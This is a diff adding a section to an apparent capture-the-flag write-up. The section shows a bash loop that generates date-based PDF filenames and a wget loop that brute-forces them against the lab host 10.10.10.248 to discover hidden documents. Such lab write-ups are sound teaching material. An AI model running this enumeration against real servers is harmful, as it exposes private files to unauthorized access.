@@ -111,3 +111,17 @@ Nmap done: 1 IP address (1 host up) scanned in 100.93 seconds
 
   - Other Document
 ![image](https://user-images.githubusercontent.com/83878909/230813172-f7359efc-a356-4629-9a8a-64564ee6cb07.png)
+
+## Brute-Force
+  - Create a wordlist to brute-force the `date`, maybe some other documents exist.
+```CSS
+▶ for i in $(seq $(date -d "2020-01-01" +%s) 86400 $(date -d "2021-05-15" +%s)); do date -d @$i "+%Y-%m-%d-upload.pdf"; done > files.txt
+```
+  - Brute-Force the filename.
+```CSS
+▶ for i in $(cat files.txt); do wget http://10.10.10.248/documents/$i; done
+```
+  - Files found.
+![image](https://user-images.githubusercontent.com/83878909/230816862-cc30d963-0b39-4c13-b2cc-7e89e51206b3.png)
+
+
